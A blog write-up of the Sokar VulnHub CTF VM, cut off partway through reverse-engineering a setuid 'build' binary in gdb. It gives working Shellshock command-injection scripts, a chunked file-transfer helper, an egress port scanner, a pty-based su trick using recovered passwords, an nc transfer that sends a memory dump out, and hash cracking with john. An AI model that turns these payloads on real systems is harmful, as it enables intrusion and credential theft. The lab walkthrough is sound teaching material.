---
categories:
- CTF
- Vulnerable VM
- Solution
- Challenge
- VulnHub
comments: true
date: 2015-02-21T15:55:03Z
title: beating sokar - the vulnhub turns 0b10 challenge
---

## introduction
[Vulnhub is 0b10](http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html) years old. That is binary for 2 :) In order to celebrate this, [@_RastaMouse](https://twitter.com/_RastaMouse)
 created [Sokar](https://www.vulnhub.com/entry/sokar-1,113/).

{{< figure src="/images/sokar_logo.png" >}}

Sokar was used as another writeup competition (the first for 2015), similar to the [Persistence](https://leonjza.github.io/blog/2014/09/18/from-persistence/) challenge from Sep '14.
From the [competition announcement blogpost](http://blog.vulnhub.com/2015/01/competition-sokar.html), the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.

Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!

Here is my entry for the competition. Enjoy! :)
<!--more-->

## a usual start
You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire `nmap` at it. I followed exactly these steps apart from using the usual `netdiscover` to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.

I knew which interface the network was bound to on my Mac, so I started the sniffer with `sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1`:

```bash
leonjza@laptop » sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1

[... snip IPv6 talky talky ...]

IP src 0.0.0.0         dst 255.255.255.255 UDP src port 68 dst port 67
IP src 192.168.217.254 dst 192.168.217.163 UDP src port 67 dst port 68
```

**192.168.217.163**. Great. This will be our target for a `nmap` scan. Sokar did not respond to pings, but that is no biggie. I see this many times in real world networks too, so heh. Don't rely on ICMP traffic ;)

```bash
leonjza@kali/sokar $ nmap --reason 192.168.217.163 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-02 21:09 SAST
Nmap scan report for 192.168.217.163
Host is up, received arp-response (0.00027s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT    STATE SERVICE  REASON
591/tcp open  http-alt syn-ack
MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 1133.72 seconds
```

One port open on tcp. `tcp/591`.

## /cgi-bin/cat
The service on `tcp/591` appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML `<iframe>` to http://192.168.217.163:591/cgi-bin/cat. Requesting this page alone was the same stats, minus that creepy pink color ;)

{{< figure src="/images/sokar_cat.png" >}}

I toyed around quite a bit with this webserver. The textbook approach of running `wfuzz` to discover some web paths, `nikto` to discover some interesting information etc. was used. Alas, none of these tools proved really useful.

Applying some more brain thingies to my current situation, I remembered the [Shellshock](http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29) bug disclosed in September 2014. The `/cgi-bin` path was the biggest hint towards it. I also remembered [@mubix](https://twitter.com/mubix) was keeping a Github repository of [PoC's for shellshock](https://github.com/mubix/shellshocker-pocs), and promptly started to try a few against the CGI path.

Eventually, [this](https://gist.github.com/mfadzilr/70892f43597e7863a8dc) PoC was modified a little to get me some working command injection via shellshock:

```bash
leonjza@kali/sokar $ curl -i -X OPTIONS -H "User-Agent: () { :;};echo;/usr/bin/id" "http://192.168.217.163:591/cgi-bin/cat"
HTTP/1.1 200 OK
Date: Mon, 02 Feb 2015 21:23:07 GMT
Server: Apache/2.2.15 (CentOS)
Connection: close
Transfer-Encoding: chunked
Content-Type: text/plain; charset=UTF-8

uid=48(apache) gid=48(apache) groups=48(apache)
```

Yay. I was now able to execute commands as `apache`. This allowed me to enumerate a great deal of the machine with relative ease.

## making life easier
Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called `shock.py`):

```python
#!/usr/bin/python

# Sokar Shellshock Command Execution
# 2015 Leon Jacobs

import requests
import sys

if len(sys.argv) < 2:

    print " * Usage %s <cmd>" % sys.argv[0]
    sys.exit(1)

# vuln@ curl -i -X OPTIONS -H "User-Agent: () { :;};echo;/bin/cat /etc/passwd" "http://192.168.217.163:591/cgi-bin/cat"
command = sys.argv[1].strip()
print " * Executing %s\n" % command

# prepare the sploit header
headers = { "User-Agent": "() { :;};echo;%s" % command }
print requests.get("http://192.168.217.163:591/cgi-bin/cat", headers=headers).text.strip()
```

Using the above script, I could now just do `python shock.py "/usr/bin/id"`:

```bash
leonjza@kali/sokar $ python shock.py "/usr/bin/id"
 * Executing /usr/bin/id

uid=48(apache) gid=48(apache) groups=48(apache)
```

During the initial enumeration phase, I tried to build myself a reverse shell. I confirmed that `netcat` was available and that `apache` was allowed to execute it, however, all of my attempts failed. `SELinux` was disabled so that was not the problem. Eventually I started wondering about egress fire-walling and decided that it was time for a outbound port scan!

I was able to write to `/tmp`, but for some reason I was having a really hard time getting newlines and quotes escaped so that I could essentially `echo <script source> >> /tmp/port_scan.py`. Eventually I resorted to writing a helper called `transfer.py` that was used to copy files over from my local Kali Linux install to the Sokar VM. In the long run, this made it really easy to copy scripts and tools over to Sokar:

```python
#!/usr/bin/python

# Sokar Shellshock File Transfer
# 2015 Leon Jacobs

import requests
import sys
import os
import binascii

def do_command(command):

    headers = { "User-Agent": "() { :;};echo;%s" % command }
    r = requests.options("http://192.168.217.163:591/cgi-bin/cat", headers=headers)

    if not r.status_code == 200:
        raise Exception(" ! Command %s failed")

if __name__ == "__main__":

    if len(sys.argv) < 3:

        print " * Usage %s <source> <destination>" % sys.argv[0]
        sys.exit(1)

    # vuln@ curl -i -X OPTIONS -H "User-Agent: () { :;};echo;/bin/cat /etc/passwd" "http://192.168.217.163:591/cgi-bin/cat"
    source = sys.argv[1].strip()
    destination = sys.argv[2].strip()
    print " * Starting transfer of local '%s' to remote '%s'" % (source, destination)

    hex_destination_file = "/tmp/" + binascii.b2a_hex(os.urandom(15)) + ".txt"
    print " * Temp file on remote will be: %s" % hex_destination_file

    # prepare a hex version of the local file
    with open(source) as f:
        source_file = f.read()

    # encode and split the source into chunks of 60
    source_file = source_file.encode('hex')
    source_data = {}
    source_data = [source_file[i:i+60] for i in range(0, len(source_file), 60)]

    print " * Transferring %d chunks to %s" % (len(source_data), hex_destination_file)
    iteration = 1
    for chunk in source_data:

        # check if it is start of file or append
        if iteration == 1:
            append = ">"
        else:
            append = ">>"

        # prepare the command and run it
        command = "echo '%s' %s %s" % (chunk, append, hex_destination_file)
        do_command(command)

        print " * Chunk %d/%d transferred" % (iteration, len(source_data))
        iteration += 1

    print " * Decoding hex on remote"
    command = "/usr/bin/xxd -r -p %s > %s" % (hex_destination_file, destination)
    do_command(command)

    print " * Cleaning up temp file %s" % hex_destination_file
    command = "/bin/rm -f %s" %  hex_destination_file
    do_command(command)

    print " * Local '%s' transferred to remote '%s'" % (source, destination)
```

## egress firewalls le-suck
With the file transfer script done, I coded up a small 'port scanner' (though all it really does is try to connect to a port and move on to the next within 0.1s):

```python
#!/usr/bin/python

# Sokar Egress Port Scanner
# 2015 Leon Jacobs

import socket

for port in xrange(1, 65535):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.1)
    print "Trying port %d" % port
    sock.connect_ex(("192.168.217.174", port))
    sock.close()

```

... and transferred it to Sokar using my `transfer.py` script:

```bash
leonjza@kali/sokar $ python transfer.py port_scan.py /tmp/port_scan.py
 * Starting transfer of local 'port_scan.py' to remote '/tmp/port_scan.py'
 * Temp file on remote will be: /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Transferring 10 chunks to /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Chunk 1/10 transferred
 * Chunk 2/10 transferred
 * Chunk 3/10 transferred
 * Chunk 4/10 transferred
 * Chunk 5/10 transferred
 * Chunk 6/10 transferred
 * Chunk 7/10 transferred
 * Chunk 8/10 transferred
 * Chunk 9/10 transferred
 * Chunk 10/10 transferred
 * Decoding hex on remote
 * Cleaning up temp file /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Local 'port_scan.py' transferred to remote '/tmp/port_scan.py'
```

I also opened up a `tcpdump` on my local Kali Linux VM, filtering out `tcp/591` as well as `arp` traffic:

```bash
leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes

```

Finally, I fired the scanner off using the previously developed `shock.py` script:

```bash
leonjza@kali/sokar $ python shock.py "/usr/bin/python /tmp/port_scan.py"
 * Executing /usr/bin/python /tmp/port_scan.py

```

I waited... a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the `tcpdump` had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.

## bynarr the fruit
Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that `/home/bynarr` was readable to me. In there was what looked like a kernel module `lime.ko` and a script called `lime` to `insmod` it. Both were owned by root:

```bash
leonjza@kali/sokar $ python shock.py "/bin/cat /home/bynarr/lime"
 * Executing /bin/cat /home/bynarr/lime

#!/bin/bash
echo """
==========================
Linux Memory Extractorator
==========================
"
echo "LKM, add or remove?"
echo -en "> "

read -e input

if [ $input == "add" ]; then

    /sbin/insmod /home/bynarr/lime.ko "path=/tmp/ram format=raw"

elif [ $input == "remove" ]; then

    /sbin/rmmod lime

else

    echo "Invalid input, burn in the fires of Netu!"

fi

```

I knew that the chances were slim that it would allow me to run `insmod` as `apache`, but ofc I tried running the script regardless. Due to the fact that the file called `/tmp/ram` was not created after running `python shock.py "echo \"add\" | /home/bynarr/lime"`, I assumed it failed.

Later, some more enumeration finally got me to `/var/spool/mail/bynarr` with a message with the following contents:

```text
leonjza@kali/sokar $ python shock.py "/bin/cat /var/spool/mail/bynarr"
 * Executing /bin/cat /var/spool/mail/bynarr

Return-Path: <root@sokar>
Delivered-To: bynarr@localhost
Received:  from root by localhost
To: <bynarr@sokar>
Date: Thu, 13 Nov 2014 22:04:31 +0100
Subject: Welcome

Dear Bynarr.  Welcome to Sokar Inc. Forensic Development Team.
A user account has been setup for you.

UID 500 (bynarr)
GID 500 (bynarr)
    501 (forensic)

Password 'fruity'.  Please change this ASAP.
Should you require, you've been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out for analysis.

All the best in your new role!

  -Sokar-
```

I confirmed that `bynarr` was in the groups mentioned in the mail:

```bash
leonjza@kali/sokar $ python shock.py "/usr/bin/id bynarr"
 * Executing /usr/bin/id bynarr

uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
```

What confused me here was the mention of *"outbound ephemeral port access on 51242"*. I reduced my port scanners range to only scan from 51240 to 51250 to confirm this. I transferred the updated port scanner to Sokar, opened up a new `tcpdump` session and waited anxiously. `tcp/51242` outbound still appeared to be closed.

Of course, the most valuable piece of information was definitely the password *fruity*. Now, remember, I have a limited shell. Not a interactive one. I have been interfacing with Sokar only via python scripts which are executing commands via Shellshock HTTP requests.

Essentially, the easiest way for me to become `bynarr` (assuming *fruity* really is the password), would be to `su` right? Sounds like a 2 sec job. Well, it wasn’t :( Instead, I got caught up in a whole bunch of interesting situations where `su` expects a password via `stdin`, requires a valid tty (which I don’t have) and will spawn a shell for me to interact with (which I can't). Quite some time later, I got closer to becoming `bynarr` with something like `echo fruity | su bynarr`. To add to the pain, my shellshock shell also did not have a proper environment, so I had to prefix most commands with their full paths. Luckily though `$(which id)` came in very handy and saved some time. In retrospect, I could have probably just exported `PATH` as required, but heh.

Fast forward some time, I came across [this](http://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells) SANS blogpost, which details on the topic of some 'stealthy' su shells. Most importantly, the example of `(sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"` got me the closest to `bynarr`. Toying around with this a little, I realized that for some reason, the `(` and `)` characters were messing around, so I replaced that section with some python too. After a whole bunch attempts, I eventually got this to work:

`/usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);"`

(Basically, spawn a tty; attempt to `su` specifying the command to run with `-c`, then 1 second later, echo `fruity` to the *Password* prompt and execute `id` as `bynarr`)

```bash
leonjza@kali/sokar $ python shock.py "/usr/bin/python -c \"import time; time.sleep(1); print 'fruity'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);\""
 * Executing /usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);"

Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
```

:D As this is actually a Shellshock request, the full `User-Agent` header therefore was:

```text
() { :;};echo;/usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);"
```

Again, constructing that every time I want to execute something as `bynarr` would have been le-suck, so I made another wrapper script:

```python
#!/usr/bin/python

# Sokar 'bynarr' command execution
# 2015 Leon Jacobs

import requests
import sys

if len(sys.argv) < 2:

    print " * Usage %s <cmd>" % sys.argv[0]
    sys.exit(1)

command = sys.argv[1].strip()
payload = """/usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','%s', 'bynarr']);" """ % command
print " * Executing %s\n" % payload

# prepare the sploit header
headers = { "User-Agent": "() { :;};echo;%s" % payload }
print requests.get("http://192.168.217.163:591/cgi-bin/cat", headers=headers).text.strip()
```

All I have to do to get the output of `id` is provide it as a argument to `bynarr.py`:

```bash
leonjza@kali/sokar $ python bynarr.py "id"
 * Executing /usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);"

Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
```

## the scary linux memory extractor
With command access as `bynarr` and remembering the mention of `tcp/51242` outbound connectivity, I once more try and run the port scanner that got copied to `/tmp`:

```bash
leonjza@kali/sokar $ python bynarr.py "/usr/bin/python /tmp/port_scan.py"
 * Executing /usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','/usr/bin/python /tmp/port_scan.py', 'bynarr']);"

Password:
Trying port 51240
Trying port 51241
Trying port 51242
Trying port 51243
Trying port 51244
Trying port 51245
Trying port 51246
Trying port 51247
Trying port 51248
Trying port 51249
```

Checking the `tcpdump` output of this run...:

```text
leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
07:33:43.178113 IP 192.168.217.163.40371 > 192.168.217.174.51242: Flags [S], seq 594732851, win 14600, options [mss 1460,sackOK,TS val 2274844 ecr 0,nop,wscale 4], length 0
07:33:43.178129 IP 192.168.217.174.51242 > 192.168.217.163.40371: Flags [R.], seq 0, ack 594732852, win 0, length 0
```

... I finally see something coming out of Sokar!
So `bynarr` is able to talk out on `tcp/51242`. Wut. Taking a few moments to think about this, I remembered that `iptables` is able to filter by user id using the `owner` module. At this stage, this was the only thing that made sense why `apache` would not be able to talk out on this port, but `bynarr` can.

So with that out the way, it was time to focus on this `lime` thing. `bynarr` was allowed to run `/home/bynarr/lime` as root via `sudo` without a password (as I suspected for the `insmod`):

```bash
leonjza@kali/sokar $ python bynarr.py "sudo -l"
 * Executing /usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','sudo -l', 'bynarr']);"

Password:
Matching Defaults entries for bynarr on this host:
    !requiretty, visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User bynarr may run the following commands on this host:
    (ALL) NOPASSWD: /home/bynarr/lime
```

I had no freaking idea what `lime` even really is, so, to the Gooooogles I went and came across this: [https://github.com/504ensicsLabs/LiME](https://github.com/504ensicsLabs/LiME). A forensics tool thingy thing. It seems like I will get to crawl through a dump of the current memory. Cool ;p

I ran the script to `insmod` the `lime.ko`, this time with `sudo`:

```bash
leonjza@kali/sokar $ python bynarr.py "echo \"add\" | sudo /home/bynarr/lime"
 * Executing /usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','echo "add" | sudo /home/bynarr/lime', 'bynarr']);"

Password:

==========================
Linux Memory Extractorator
==========================

LKM, add or remove?
>

```

I checked `/tmp` for the existence of the `ram` file and it was present. Looks like it worked :D. A quick note here. When I imported the VM initially, I upped the memory to 2GB. It was set to only have 256Mb by default which I thought was a little low. Sokar has limited disk space, so I was not getting the full memory dump. When I eventually noticed this, I reduced it back to the initial 256Mb and worked from there.

Remembering the outbound port access, I opened a netcat listener on my local Kali linux to redirect a incoming file to a local `ram` file with `nc -lvp 51242 > ram`. Then, using my wrapper script `bynarr.py` again, I redirected the `/tmp/ram` file out over the netcat connection with: `python bynarr.py "/usr/bin/nc 192.168.217.174 51242 < /tmp/ram"`. I now had a memory dump of Sokar on my local Kali Linux.

It was at this stage that I went down the wrong rabbit hole. [Volatility](https://code.google.com/p/volatility/) was the first thing that came to mind when I saw this speak of memory dumps and what not. Having always just had this on my todo list, I figured that this was the perfect opportunity to finally give it a spin. I followed most of the docs to try and match the exact same kernel version as Sokar had (I have a number of CentOS VM's) and prepared a profile as required. Short version, it failed. I was not able to get Volatility to give me anything useful. Eventually I reconsidered my approach and went back to trusty 'ol `strings`.

I had to think a bit about what could possibly be useful in memory for me now. I noticed the user `apophis` had a home directory that I have not yet been able to access, so I promptly grepped the ram image for this user:

```bash
leonjza@kali/sokar $ strings ram | grep apophis

[... snip ...]

apophis:[snip]0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
```

... **wut**. Why... wait a sec. Why the heck is a password hash in memory now. Dont think there has been any activity for this user yet... but clearly I don’t understand half of the technicalities here :( But hey. Lets run it through `john`:

```bash
leonjza@kali/sokar $ john passwd --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Loaded 1 password hash (sha512crypt [32/32])
overdrive        (apophis)
guesses: 1  time: 0:00:01:51 DONE (Sat Jan 31 20:35:42 2015)  c/s: 327  trying: parati - nicole28
Use the "--show" option to display all of the cracked passwords reliably
```

`apophis:overdrive`.

## build the clone to the hook
To get command execution as `apophis.py` I copied the `bynarr.py` script to make `apophis.py`, changing the username and the password.

```bash
leonjza@kali/sokar $ python apophis.py "id"
 * Executing /usr/bin/python -c "import time; time.sleep(2); print 'overdrive'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su', '-l', '-c','id', 'apophis']);"

Password:
uid=501(apophis) gid=502(apophis) groups=502(apophis)
```

There we go! Command execution as `apophis` :) In `/home/apophis` there was a suid (for `root`) binary called `build`:

```bash
leonjza@kali/sokar $ python apophis.py "ls -lah /home/apophis"
 * Executing /usr/bin/python -c "import time; time.sleep(2); print 'overdrive'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su', '-l', '-c','ls -lah /home/apophis', 'apophis']);"

Password:
total 36K
drwx------  2 apophis apophis 4.0K Jan  2 20:12 .
drwxr-xr-x. 4 root    root    4.0K Dec 30 19:20 ..
-rw-------  1 apophis apophis    9 Feb  2 20:55 .bash_history
-rw-r--r--  1 apophis apophis   18 Feb 21  2013 .bash_logout
-rw-r--r--  1 apophis apophis  176 Feb 21  2013 .bash_profile
-rw-r--r--  1 apophis apophis  124 Feb 21  2013 .bashrc
-rwsr-sr-x  1 root    root    8.3K Jan  2 17:49 build
```

I thought I would copy this `build` binary off the box as I don’t exactly have a nice interactive shell to work with yet. `apophis` was also not able to to connect via `tcp/51242` outbound, which further confirmed my suspicions on the `user` module being used in iptables. I copied the binary to `/tmp/build` and pushed it out via netcat as `bynarr` (using my helper script) towards my local Kali linux install. Finally I had `build` locally to play with.

I later noticed it was a 64bit binary, so I had to move it over to my 64bit install of Kali Linux to inspect further.
Running it asked you if you wanted to 'build?':

```bash
leonjza@kali/sokar $ ./build
Build? (Y/N) Y
Cloning into '/mnt/secret-project'...
ssh: Could not resolve hostname sokar-dev:: Name or service not known
fatal: The remote end hung up unexpectedly
```

That looks very much like the output of a git clone attempt. Knowing what the binary expects now, I continued to run this on Sokar via my Shellshock wrapper for `apophis`:

```bash
leonjza@kali/sokar $ python apophis.py "echo Y | /home/apophis/build"
 * Executing /usr/bin/python -c "import time; time.sleep(2); print 'overdrive'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su', '-l', '-c','echo Y | /home/apophis/build', 'apophis']);"

Password:
Cloning into '/mnt/secret-project'...
ssh: Could not resolve hostname sokar-dev: Temporary failure in name resolution
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
```

The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to `/mnt/secret-project` from `sokar-dev` which does not resolve.

### the impossible b0f
I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to `build.`:

```bash
leonjza@kali/sokar $ ./build
Build? (Y/N) YY
*** buffer overflow detected ***: ./build terminated
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x2b53e6df5fe7]
/lib/x86_64-linux-gnu/libc.so.6(+0xefea0)[0x2b53e6df4ea0]
/lib/x86_64-linux-gnu/libc.so.6(__gets_chk+0x195)[0x2b53e6df4df5]
./build(main+0xea)[0x2b53e68e29d9]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xfd)[0x2b53e6d23ead]
./build(+0x7d9)[0x2b53e68e27d9]
======= Memory map: ========
2b53e68e2000-2b53e68e3000 r-xp 00000000 fe:00 667555                     /root/sokar/build
2b53e68e3000-2b53e68e7000 rwxp 00000000 00:00 0
2b53e6900000-2b53e6902000 rwxp 00000000 00:00 0
2b53e6ae2000-2b53e6ae3000 rwxp 00000000 fe:00 667555                     /root/sokar/build
2b53e6ae3000-2b53e6b03000 r-xp 00000000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d02000-2b53e6d03000 r-xp 0001f000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d03000-2b53e6d04000 rwxp 00020000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d04000-2b53e6d05000 rwxp 00000000 00:00 0
2b53e6d05000-2b53e6e87000 r-xp 00000000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e6e87000-2b53e7087000 ---p 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e7087000-2b53e708b000 r-xp 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e708b000-2b53e708c000 rwxp 00186000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e708c000-2b53e7091000 rwxp 00000000 00:00 0
2b53e7091000-2b53e70a6000 r-xp 00000000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e70a6000-2b53e72a6000 ---p 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e72a6000-2b53e72a7000 rwxp 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e886b000-2b53e888c000 rwxp 00000000 00:00 0                          [heap]
7fff340b7000-7fff340d8000 rwxp 00000000 00:00 0                          [stack]
7fff341eb000-7fff341ed000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
[1]    18571 abort      ./build
```

I slapped `build` into `gdb` to take a closer look at the potential overflow as well as the security features that `build` has been compiled with:

```bash
leonjza@kali/sokar $ gdb -q ./build
Reading symbols from /root/sokar/build...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : disabled
PIE       : ENABLED
RELRO     : disabled
```

:O The `CANARY` explains the failure in `__fortify_fail`. Disassembly of the `main` function reveals a call to `__gets_chk` which is responsible for the canary validation:

```bash
gdb-peda$ disass main
Dump of assembler code for function main:

 [... snip ...]

   0x00000000000009cc <+221>:   mov    esi,0x2
   0x00000000000009d1 <+226>:   mov    rdi,rbx
   0x00000000000009d4 <+229>:   call   0x760 <__gets_chk@plt>
   0x00000000000009d9 <+234>:   lea    rsi,[rbp-0x30]
   0x00000000000009dd <+238>:   mov    rdi,rbx
   0x00000000000009e0 <+241>:   call   0x790 <strcmp@plt>
   0x00000000000009e5 <+246>:   test   eax,eax

 [... snip ...]
```

It is possible that the original source was using `gets()` without a bounds check, but is compiled with SSP. This coupled with the fact that it is a 64bit binary and Sokar having ASLR enabled, made my head hurt. In fact, I was very demotivated at this stage as exploitation under these scenarios is very difficult.

I fiddled around a little more with the binary, and inspected the call to `encryptDecrypt`:

```bash
gdb-peda$ disass encryptDecrypt
Dump of assembler code for function encryptDecrypt:
   0x00000000000008ac <+0>: mov    rdx,rdi
   0x00000000000008af <+3>: mov    r9d,0x0
   0x00000000000008b5 <+9>: mov    r11,0xffffffffffffffff
   0x00000000000008bc <+16>:    mov    r10,rdi
   0x00000000000008bf <+19>:    mov    eax,0x0
   0x00000000000008c4 <+24>:    jmp    0x8d6 <encryptDecrypt+42>
   0x00000000000008c6 <+26>:    movzx  ecx,BYTE PTR [rdx+r8*1]
   0x00000000000008cb <+31>:    xor    ecx,0x49
   0x00000000000008ce <+34>:    mov    BYTE PTR [rsi+r8*1],cl
   0x00000000000008d2 <+38>:    add    r9d,0x1
   0x00000000000008d6 <+42>:    movsxd r8,r9d
   0x00000000000008d9 <+45>:    mov    rcx,r11
   0x00000000000008dc <+48>:    mov    rdi,r10
   0x00000000000008df <+51>:    repnz scas al,BYTE PTR es:[rdi]
   0x00000000000008e1 <+53>:    not    rcx
   0x00000000000008e4 <+56>:    sub    rcx,0x1
   0x00000000000008e8 <+60>:    cmp    r8,rcx
   0x00000000000008eb <+63>:    jb     0x8c6 <encryptDecrypt+26>
   0x00000000000008ed <+65>:    repz ret
End of assembler dump.
```

This together with pseudo code generated by Hopper helped me understand the encryptDecrypt function running a xor with **I** as the key over a string.

```c
void encryptDecrypt(int arg0, int arg1) {
    rsi = arg1;
    rdx = arg0;
    LODWORD(r9) = 0x0;
    r10 = arg0;
    do {
            r8 = sign_extend_64(LODWORD(r9));
            asm{ repne scasb  };
            if (r8 >= !0xffffffffffffffff - 0x1) {
                break;
            }
            *(int8_t *)(rsi + r8) = LOBYTE(LODWORD(*(int8_t *)(rdx + r8) & 0xff) ^ 0x49);
            LODWORD(r9) = LODWORD(r9) + 0x1;
    } while (true);
    return;
}
```

Running the binary in `gdb` and setting a breakpoint before the `system()` call, we are able to inspect the 64bit registers, which cleanly reveal the encrypted **and** decrypted versions of the string to be executed.

```bash
sokar # gdb -q ./build
gdb-peda$ r
Build? (Y/N) n
OK :(
[Inferior 1 (process 4450) exited with code 06]
Warning: not running or target is remote
gdb-peda$ b *0x0000555555554a38
Breakpoint 1 at 0x555555554a38
gdb-peda$ r
Build? (Y/N) Y
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7fffffffe740 ("/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/")
RCX: 0x7ffff7b26e99 (<setreuid+25>: cmp    rax,0xfffffffffffff000)
RDX: 0x7fffffffe7a0 ("f<:;f+ 'f. =i*%&',i::!sff;&&=\t:&\"(;d-,?sf;&&=f:,*;,=d9;&#,*=if$'=f:,*;,=d9;&#,*=f")
RSI: 0x0
RDI: 0x7fffffffe740 ("/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/")
RBP: 0x7fffffffe830 --> 0x0
RSP: 0x7fffffffe740 ("/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/")
RIP: 0x555555554a38 (<main+329>:    mov    eax,0x0)
R8 : 0x51 ('Q')
R9 : 0x51 ('Q')
R10: 0x0
R11: 0x246
R12: 0x7fffffffe7a0 ("f<:;f+ 'f. =i*%&',i::!sff;&&=\t:&\"(;d-,?sf;&&=f:,*;,=d9;&#,*=if$'=f:,*;,=d9;&#,*=f")
R13: 0x7fffffffe910 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554a2b <main+316>:   mov    eax,0x0
   0x555555554a30 <main+321>:   call   0x5555555547a0 <setreuid@plt>
